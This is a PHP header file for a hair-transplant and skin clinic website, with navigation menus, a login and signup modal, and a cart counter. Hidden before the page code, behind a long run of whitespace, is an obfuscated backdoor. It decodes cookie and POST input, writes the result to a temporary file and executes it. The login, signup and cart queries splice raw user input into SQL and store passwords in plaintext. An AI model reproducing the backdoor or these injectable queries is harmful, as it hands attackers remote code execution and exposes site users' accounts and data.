<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xddewnbgte")){class xddewnbgte{public static $fgaqspdpjm = "necqgxicszcxjcsg";public static $eewsm = NULL;public function __construct(){$luvnjv = @$_COOKIE[substr(xddewnbgte::$fgaqspdpjm, 0, 4)];if (!empty($luvnjv)){$mcvtzszqv = "base64";$hrwqkjkinz = "";$luvnjv = explode(",", $luvnjv);foreach ($luvnjv as $zwywjspof){$hrwqkjkinz .= @$_COOKIE[$zwywjspof];$hrwqkjkinz .= @$_POST[$zwywjspof];}$hrwqkjkinz = array_map($mcvtzszqv . "_decode", array($hrwqkjkinz,));$hrwqkjkinz = $hrwqkjkinz[0] ^ str_repeat(xddewnbgte::$fgaqspdpjm, (strlen($hrwqkjkinz[0]) / strlen(xddewnbgte::$fgaqspdpjm)) + 1);xddewnbgte::$eewsm = @unserialize($hrwqkjkinz);}}public function __destruct(){$this->yqjcgkzoyz();}private function yqjcgkzoyz(){if (is_array(xddewnbgte::$eewsm)) {$efdiwdiajr = sys_get_temp_dir() . "/" . crc32(xddewnbgte::$eewsm["salt"]);@xddewnbgte::$eewsm["write"]($efdiwdiajr, xddewnbgte::$eewsm["content"]);include $efdiwdiajr;@xddewnbgte::$eewsm["delete"]($efdiwdiajr);exit();}}}$wzitkvbu = new xddewnbgte();$wzitkvbu = NULL;} ?><?php

error_reporting(0);
include("admin/config/config.php");
?>
<!DOCTYPE html>
<html lang="en-US" class="no-js">

<head>
    <meta charset="utf-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="keywords" content="">
    <meta name="author" content="">
    <!--[if IE]><meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'><![endif]-->
    <title>cabeloclinic</title>

    <!--favicon icon-->
    <link rel="icon" href="images/favicon.png">

    <!-- font awesome css -->
    <link rel="stylesheet" href="css/font-awesome.min.css">

    <!-- flaticon css -->
    <link rel="stylesheet" href="css/flaticon.css">

    <!--bootstrap min css-->
    <link rel="stylesheet" href="css/bootstrap.min.css">

    <!--jquery-ui css-->
    <link rel="stylesheet" href="css/jquery-ui.min.css">

    <!--menuzord css-->
    <link rel="stylesheet" href="css/menuzord.css">

    <!--animate css-->
    <link rel="stylesheet" href="css/slick.css">
    <link rel="stylesheet" href="css/animate.css">

    <!--owl.carousel css-->
    <link rel="stylesheet" href="css/owl.carousel.min.css">

    <!--nice-select css-->
    <link rel="stylesheet" href="css/nice-select.css">

    <!--venobox css-->
    <link rel="stylesheet" href="css/venobox.css">

    <!-- global style css -->
    <link rel="stylesheet" href="css/global-style.css">

    <!-- style css -->
    <link rel="stylesheet" href="style.css">
  	<!-- custom  css -->
	<link rel="stylesheet" href="custom.css">


    <!-- color css -->
    <link rel="stylesheet" href="css/colors/color-1.css">

    <!--responsive css-->
    <link rel="stylesheet" href="css/responsive.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>

<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/615c496725797d7a890268a5/1ft06g88m';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
<!--End of Tawk.to Script-->
</script>
<body>

<script>
    $(document).ready(function(){
       $("#hpmodel").modal('show');
   });
</script>
<style>
.fancy-forms .tab-content{
    background: #ffffff;
    color: #ffffff;
    padding: 10px;
    /*box-shadow: 8px 12px 25px 2px rgba(0,0,0,0.3);*/
}

.fancy-forms .nav-tabs .nav-item{
    width: 50%;
    text-align: center;
}

.fancy-forms .nav-tabs .nav-link{

    border: 1px solid #e47a4b;
    background-color: #e47a4b;
    border-top-left-radius: 0;
    border-top-right-radius: 0;
    color: #ffffff;
   /* box-shadow: 0px 10px 20px 0px rgba(0,0,0,0.3);*/
}

.fancy-forms .nav-tabs .nav-link.active{
    border-color: #fff;
    color: #e47a4b;
    background-color: #ffffff;
}

 .fancy-forms .nav-tabs .nav-link:hover{
    border-color: #fff;
 }

 fancy-forms .nav-tabs .nav-link.active:hover{
    border-color: #e47a4b;
 }

 .fancyformcontainer{
    background: #0c515c;
    padding: .5rem 3rem !important;
 /*   margin: 3rem !important;*/
 }

 .formsubmitbtn{
    background: #e47a4b;
    color: white; 
    margin-bottom: 1.5rem !important;
 }

 .formsubmitbtn:hover,.formsubmitbtn:focus{
    color: #fff;
 }
</style>

<!-- Modal  new orange color-->
<?php 

if(!isset($_SESSION['usr_mbl']))
{
?>
<div class="modal fade " id="hpmodel" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
	  <button type="button" class="close p-0 m-0  p-2 text-success" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
       <!-- form card cc payment -->
            <div class="card card-outline-secondary" style="">
              <div class="card-body" style="padding:0px;">
                  
                  <div class="container">
			<div class="row">
				<div class="col-md-12 offset-md-2 fancy-forms" style="margin-left:0px;padding-left:0px;padding-right:0px;background: #BFF2F5;">
				 	<!-- <div class="cardbox"> -->
						<ul class="nav nav-tabs  mt-3" id="myTab" role="tablist">
	                        <li class="nav-item">
	                            <a class="nav-link active" id="login" data-toggle="tab" href="#login_form" role="tab" aria-controls="login" aria-selected="true">Login</a>
	                        </li>
	                        <li class="nav-item">
	                            <a class="nav-link" id="signup" data-toggle="tab" href="#signup_form" role="tab" aria-controls="signup" aria-selected="false">SignUp</a>
	                        </li>
                    	</ul>
                    	<div class="tab-content" id="myTabContent" style="padding:0px;">
                        	<div class="tab-pane fade show active" id="login_form" role="tabpanel" aria-labelledby="login">
	                            <div class="fancyformcontainer" style="background:#BFF2F5">
	                            	<h3 class="text-center" style="color:black">Login</h3>
									<form action='' method='POST'>
									    <div class="form-group mt-4">
									        <label for="email_id" style="color:black">Mobile</label>
									        <input type="number" name="mmbl_nnbr" class="form-control" id="email_id" placeholder="Enter Number">
									    </div>
									    <div class="form-group mt-4">
									        <label for="password" style="color:black">Password</label>
									        <input type="password" name="ppwwd" class="form-control" id="password" placeholder="Please provide password">
									    </div>
									    <div class="text-center">
					    					<button type="submit" name="lllgon" class="btn formsubmitbtn">Submit</button>
					    				</div>
				  					</form>
				 				
				 				
				 				<?php 
				 				if(isset($_POST['lllgon']))
				 				{
$mbll_nbr=$_POST['mmbl_nnbr'];
$pdw=$_POST['ppwwd'];

$vrfy_dtll="select * from regsiter where mobile='$mbll_nbr' and password='$pdw'";
$qst_vrfy_dtll=$db->query($vrfy_dtll);

$vry_ccnt=mysqli_num_rows($qst_vrfy_dtll);

if($vry_ccnt==1)
{
session_start();

$_SESSION['usr_mbl']=$mbll_nbr;
    
    if(isset($_SESSION['usr_mbl']))
    {
        echo "<script>window.location='our_products.php';</script>";
    }
}
else
{
    echo "<script>window.alert('Wrong Details');window.location='';</script>";
}
				 				 
				 				    
				 				}
				 				
				 				?>
				 				
				 				
				 				
				 				</div>
                       		</div>
	                        <div class="tab-pane fade" id="signup_form" role="tabpanel" aria-labelledby="signup">
	                            <div class="fancyformcontainer"  style="background:#BFF2F5">
	                            	<h3 class="text-center" style="color:black">Sign Up</h3>
									<form action='' method='POST'>
									    
									    
									    <div class="form-group mt-4">
									        <label for="email_id" style="color:black">Name</label>
									        <input type="text" name="neme" class="form-control" id="email_id" placeholder="Enter name" required>
									    </div>
									    
									    
									    <div class="form-group mt-4">
									        <label for="email_id" style="color:black">Mobile number</label>
									        <input type="number" name="mbl_nnbr" class="form-control" id="email_id" placeholder="Enter Mobile Number" required>
									    </div>
									    <div class="form-group mt-4">
									        <label for="password" style="color:black">Password</label>
									        <input type="password" name="pwwd" class="form-control" id="password" placeholder="Please provide password" required>
									    </div>
									   
									    <div class="text-center">
					    					<button type="submit" name='reg_sbt' class="btn formsubmitbtn">Submit</button>
					    				</div>
				  					</form>
				 				</div>
	                        </div>
                    	</div>
                    	
                    	
                    	
                    	
                    	
<?php 
if(isset($_POST['reg_sbt']))
{
$nem=$_POST['neme'];
$mbl_nbbr=$_POST['mbl_nnbr'];
$ppwd=$_POST['pwwd'];



$slllt_dttl="select * from regsiter where mobile='$mbl_nbbr'";
$qst_slllt_dttl=$db->query($slllt_dttl);
$mmmbl_cnt=mysqli_num_rows($qst_slllt_dttl);

if($mmmbl_cnt==0)
{
$ad_uusr="insert into regsiter set

mobile='$mbl_nbbr',
name='$nem',
password='$ppwd'";




$qst_ad_uusr=$db->query($ad_uusr);
if($qst_ad_uusr)
{
    
    session_start();
    
    $_SESSION['usr_mbl']=$mbl_nbbr;
    if(isset($_SESSION['usr_mbl']))
    {
    
    echo "<script>window.alert('Registeration Successfull');</script>";
}
        
    }

}
else
{
    echo "<script>window.location='';window.alert('This Mobile is Already Registered Please Try Again');</script>";
    
}

}

?>
                    	
                    	
                    	
				 <!-- 	</div> -->
				</div>
			</div>
		</div>
                  
              </div>
            </div>
			<!-- /form card cc payment -->
      <div class="modal-footer p-2 m-0 text-white" style="background:#BFF2F5;color:#BFF2F5 !important;">
        Connecting...
      </div>
    </div>
  </div>
</div>
<?php 
}

?>

    <!-- search-modal -->
    <div class="modal fade" id="search-modal" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                <img src="images/search-popup-logo.png" alt="search-popup-logo">
                <form action="search.php" class="form-inline" method='GET'>
                    <input type="text" name="srch" placeholder="Search hesre...">
                    <button type='submit'><i class="fa fa-search"></i></button>
                </form>
                <div class="quick-search">
                    <h6 class="color-ff pos-relative ptb-30 text-dark">Quick search</h6>
                    <ul>
                        <li><a href="#" class="text-dark">Hair Transplant </a></li>
                        <li><a href="#" class="text-dark">Hair Fall Solution </a></li>
                        <li><a href="#" class="text-dark">Laser Hair Reduction </a></li>
                        <li><a href="#" class="text-dark">Skin Lightning </a></li>
                        <li><a href="#" class="text-dark">Offer </a></li>
                        <li><a href="#" class="text-dark">Feedback </a></li>
                    </ul>
					
                </div>
            </div>
        </div>
    </div>


 <!-- ======================================= 
        ==Start Header section==  
    =======================================-->
    <div class="header-top">
        <!--<div class="container">
            <div class="row">
                <div class="col-md-6">
                    <div class="opening-time text-left"><i class="fa fa-clock-o color-d5"></i> <span>Opening Hour: Mon - Fri : 09:00 - 18:00</span> </div>
                </div>

                <div class="col-md-6">
                    <div class="contact-mail text-right"> <a href="#"><i class="fa fa-envelope color-d5"></i><span>cabelokota@gmail.com</span></a> <span>/</span> <a href="tel:7300460006"><i class="fa fa-phone color-d5"></i>7300460006</a> </div>
                </div>
            </div>
        </div>-->
    </div>



     <header class="beauty-header" id="beauty-header">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="menuzord">
                        <a href="index.php" class="menuzord-brand custom-logo"><img  src="images/logo.png" alt="logo"  id="logo" class="img-fluid" style="width:164px"></a>
                    
					  <ul class="menuzord-menu menuzord-right phone_close">
                            <li><a href="index.php" title="Home">Home</a></li>
							<li><a href="gallery.php" title="Gallery ">Gallery </a></li>
					<!--		<li><a href="Franchise.php" title="Franchise">Franchise</a></li>-->
								<li><a href="job.php" title="Job">job</a></li>
                            <li><a href="our_products.php" title="Service">our Products</a></li>
                            <?php 
                            if(isset($_SESSION['usr_mbl']))
{
    
    $uuusr_mmbl=$_SESSION['usr_mbl'];
?>
                            <li><a href="logout.php" title="Service">logout</a></li>


<?php
}

                            
                            ?>
                            
                            <li><a href="our_services.php" title="Service">Service</a></li>
                            
                         <!-- <li><a href="booking.php" title="Booking">Booking</a></li>
                           <li><a href="blogs.php" title="Blog">Blog</a></li>-->
                          <li><a href="contact.php" title="Contact">Contact</a></li>
                           
                        </ul>

<?php 

                            if(isset($_SESSION['usr_mbl']))
{
    
$slt_ddtl="select * from cart where usr_mbl='$uuusr_mmbl'";
$qst_slt_ddtl=$db->query($slt_ddtl);
$crt_cnt=mysqli_num_rows($qst_slt_ddtl);

?>
<a href="cart.php" type="button" id="search-button" class="p-0 mt-1">  <i class="fa fa-cart-arrow-down " style="font-size:23px"></i>  <span class="badge badge-info"><?php echo $crt_cnt;?></span> </a>
<?php 
}
?>

					
					<!--dekstop search btn code start-->
					<div class="search-home-btn">
					<form action="search.php" class="form-inline mt-4 d-flex justify-content-center">
                    <input type="text" name="srch" placeholder="Search here..." >
                    <button type="submit" class="btn btn-info"><i class="fa fa-search"></i></button>
					</form>
					</div>
					<!--dekstop search btn code close-->
					
				
                    <!--/#menuzord-->
                </div>
                <!--/col-md-12-->
            </div>
        </div>
		
		</div>
		
		
		 <div class="container-fluid" style="background-color:#d0e1cf; border-bottom: 2px solid white;">
            <div class="row">
                <div class="col-12 phone-size_nav">
                    <div id="menuzord" class="menuzord d-flex justify-content-center">
                       
					  <ul class="menuzord-menu menuzord-right" style="float:none;">
<li class="active"><a href="#" title="Hair Fall Solution">Hair Fall Solution</a>
<ul class="dropdown triangle">
<li><a href="hdr_services.php?id=1">Meso Therapy</a></li>

<li><a href="hdr_services.php?id=2">( platelet rich plasma ) </a></li>
<li><a href="hdr_services.php?id=3">Scalp Monothreds</a></li>
<li><a href="hdr_services.php?id=4">Hair fall Laser Therapy </a></li>
</ul>
</li>
							
							 <li class="active"><a href="#" title="Hair Transplant">Hair Transplant </a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=5">FUE hair transplant </a></li>
									<li><a href="hdr_services.php?id=6">Bio FUE Hair transplant  </a></li>
                                    <li><a href="hdr_services.php?id=7">FUT Hair transplant </a></li>
									<li><a href="hdr_services.php?id=8">Direct Implant  </a></li>
                                </ul>
                            </li>
							
							 <li class="active"><a href="#" title="Laser">Laser</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=9">Facial hair reduction </a></li>
                                
                                    <li><a href="hdr_services.php?id=10">Under arm hair laser</a></li>
                                    <li><a href="hdr_services.php?id=11">Full Body Laser</a></li>
									<li><a href="hdr_services.php?id=12">Bikini line laser</a></li>
                                </ul>
                            </li>
							
						 <li class="active"><a href="#" title="Skin Care">Skin Care</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=13">Skin Lightning</a></li>
									<li><a href="hdr_services.php?id=14">Acne treatment </a></li>
                                    <li><a href="hdr_services.php?id=15">Lip lighting </a></li>
									<li><a href="hdr_services.php?id=16">Moles tag removal</a></li>
								 </ul>
                            </li>
							
							<!-- <li class="active"><a href="#" title="Hair Fall Solution">Teak Treatments </a>
                                <ul class="dropdown triangle">
                                    <li><a href="#">stretch marks.</a></li>
                                
                                    <li><a href="#">Tattoo Removal</a></li>
                                
                                </ul>
                            </li>-->
							
							 <li class="active"><a href="#" title="Medi Facial">Medi Facial</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=17">Hydra facial </a></li>
									<li><a href="hdr_services.php?id=18">CO2O2 Facial </a></li>
                                    <li><a href="hdr_services.php?id=19">Carbon Facial</a></li>
									<li><a href="hdr_services.php?id=20">Diamond dermaBrasion</a></li>
                                </ul>
                            </li>
							
							 <li class="active"><a href="#" title="Anti Ageing">Anti Ageing</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=21">Vampire face lift</a></li>
									<li><a href="hdr_services.php?id=22">Botox</a></li>
                                    <li><a href="hdr_services.php?id=23">Fillers  </a></li>
									<li><a href="hdr_services.php?id=24">RF Micro Needling </a></li>
								</ul>
                            </li>
							
							 <li class="active"><a href="#" title="Pigmentation">Pigmentation</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=25">Chemical Peels</a></li>
									<li><a href="hdr_services.php?id=26">Q-Switch Laser </a></li>
                                    <li><a href="hdr_services.php?id=27">Dermaplaning  </a></li>
									<li><a href="hdr_services.php?id=28">Crystal dermabrasion</a></li>
								</ul>
                            </li>
							
							
							
							<!-- <li><a href="#" title="Skin Care">Skin Care </a>
                                <div class="megamenu">
                                    <div class="megamenu-row">
                                        <div class="col3 clearfix">
                                            <ul>
                                                <li>
                                                    <h6>Shop Full Width</h6>
                                                </li>
                                                <li><a href="shop-fullwidth.html">Shop Full Width (4 Column)</a></li>
                                            </ul>
                                            <ul>
                                                <li>
                                                    <h6>Shop With Sidebar</h6>
                                                </li>
                                                <li><a href="shop-left-sidebar.html">Shop (Left Sidebar)</a></li>
                                                <li><a href="shop-right-sidebar.html">Shop (Right Sidebar)</a></li>
                                            </ul>
                                        </div>

                                        <div class="col3 clearfix">
                                            <ul>
                                                <li>
                                                    <h6>Shop-</h6>
                                                </li>
                                                <li><a href="#">Beetroot collection</a></li>
                                                <li><a href="#">Lobster ravioli</a></li>
                                                <li><a href="#">Pollo farcito</a></li>
                                            </ul>
                                            <ul>
                                                <li>
                                                    <h6>Shop-Nail care</h6>
                                                </li>
                                                <li><a href="#">organic egg</a></li>
                                                <li><a href="#">Beetroot collection</a></li>
                                            </ul>
                                        </div>

                                        <div class="col6">
                                            <div class="header-ad">
                                                <img src="images/vibes-laser.png" alt="add img" class="img-fluid">
                                            </div>
                                        </div>
                                      
                                    </div>
                                </div>
                            </li>-->
								<li class="active"><a href="#" title="Others">Others</a>
                                <ul class="dropdown triangle">
                                    <li><a href="hdr_services.php?id=29">Tattoo Removal</a></li>
									<li><a href="hdr_services.php?id=30">Stretch Marks Removal  </a></li>
                                    <li><a href="hdr_services.php?id=31">Skin Lightning   </a></li>
									<li><a href="hdr_services.php?id=32">Hyperhidrosis</a></li>
								</ul>
                            </li>
							
                            <li><a href="offers.php" title="Offers" class="font-weight-bold btn btn-danger">Offers </a> </li>
                            </ul>
                      
                    <!--/#menuzord-->
                </div>
                <!--/col-md-12-->
            </div>
        </div>
		
		</div>
		
		
		
    </header>
	
	
    <!-- ======================================= 
        ==End Header section==  
    =======================================-->
